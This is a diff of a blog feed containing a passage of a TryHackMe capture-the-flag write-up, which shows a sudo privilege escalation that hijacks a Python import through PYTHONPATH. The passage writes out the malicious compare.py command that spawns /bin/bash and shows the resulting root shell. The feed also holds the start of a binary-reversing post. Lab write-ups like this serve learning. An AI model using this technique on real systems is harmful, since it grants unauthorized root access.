+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Damn :/ at this point I wasn’t too sure what to do, I checked to see if this was a well known module with known exploits, I checked to see if I could edit the code behind the module it imports. Nothing I tried seemed to work. So I looked again at the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, remembering I had seen some unfamiliar stuff.&lt;/p&gt;
+
+&lt;p&gt;I had neglected the &lt;code class=&quot;highlighter-rouge&quot;&gt;env_keep+=PYTHONPATH&lt;/code&gt; part of this output. This is important because we can our own environment variables, and when &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python3 /opt/development/test_module.py&lt;/code&gt; is ran, it will use the &lt;code class=&quot;highlighter-rouge&quot;&gt;PYTHONPATH&lt;/code&gt; environment variable if we have set one. With a bit of research, we find out that this variable tells python where to look for additional modules. So presumably we are able to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;PYTHONPATH&lt;/code&gt; environment variable to somewhere where we have write access, and then make a &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file that overwrites the one this script imports. So let’s try that.&lt;/p&gt;
+
+&lt;p&gt;There are a few directories that all users should always have access to such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; that we could write to, but we don’t need to worry about having to do this because we are a user with a home directory, so we are able to write here&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ export PYTHONPATH=/home/wes; echo &quot;import os&quot; &amp;gt; compare.py; echo &quot;os.system('/bin/bash')&quot; &amp;gt;&amp;gt; compare.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So with this, we have set the environment variable such that python will read the &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file from the user &lt;code class=&quot;highlighter-rouge&quot;&gt;wes&lt;/code&gt;’s home directory. Then we have some code in this file that should start a shell. Because this would be running as root we would get a root shell :)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
+
+id    
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we got a shell, but it doesn’t look very nice. If we wanted to spawn a TTY shell we could have used the &lt;code class=&quot;highlighter-rouge&quot;&gt;pty&lt;/code&gt; module in python, not that it matters now that we have root.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root/root.txt
+JPC{do it yourself}
+
+Also huge shoutout to Westar for the OSINT idea
+i wouldn't have used it if it wasnt for him.
+and also thank you to Wes and Optional for all the help while developing
+
+You can find some of their work here:
+https://github.com/WesVleuten
+https://github.com/optionalCTF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awesome :) This was a nice room&lt;/p&gt;</content><author><name>JamBot</name></author><category term="thm" /><category term="pentesting" /><summary type="html">Explanation</summary></entry><entry><title type="html">Cool binary reversing stuff</title><link href="http://localhost:4000/blog/misc-binexp-writeup" rel="alternate" type="text/html" title="Cool binary reversing stuff" /><published>2021-01-10T00:00:00+00:00</published><updated>2021-01-10T00:00:00+00:00</updated><id>http://localhost:4000/blog/bx01</id><content type="html" xml:base="http://localhost:4000/blog/misc-binexp-writeup">&lt;h2 id=&quot;what&quot;&gt;What?&lt;/h2&gt;
 
 &lt;p&gt;Okay so uh lemme explain where I’ve been- basically I haven’t posted any blogs lately due to working on some cool projects and some health issues. I’ve been spending a ton of time developing a HTB machine that I hope is going to end up in use on the site (this would be rly epic for me ngl). I’ve also been working on a ton of other projects that I plan on blogging about. But yea, rn as of this date there aren’t any plans for GCSE exams to take place, so all my teachers are oversetting work and I’m having to keep up with that, working out, and my own projects- so it’s pretty hard finding the time to write blogs atm.`&lt;/p&gt;
 
@@ -485,7 +740,7 @@ THM{REDACTED}
 
 &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Blogs are normally made over a few days, so for THM the IP address referenced may vary.&lt;/p&gt;
 
-&lt;p&gt;###Getting your ovpn file&lt;/p&gt;
+&lt;h3 id=&quot;getting-your-ovpn-file&quot;&gt;Getting your ovpn file&lt;/h3&gt;
 
 &lt;p&gt;Tryhack me, like a lot of other similar sites uses openvpn to allow people to connect to their machines. To do this we need a configuration file that will be unique to each person. To get this file simply go to &lt;a href=&quot;https://tryhackme.com/access&quot;&gt;here&lt;/a&gt; and download your configuration file.&lt;/p&gt;
 
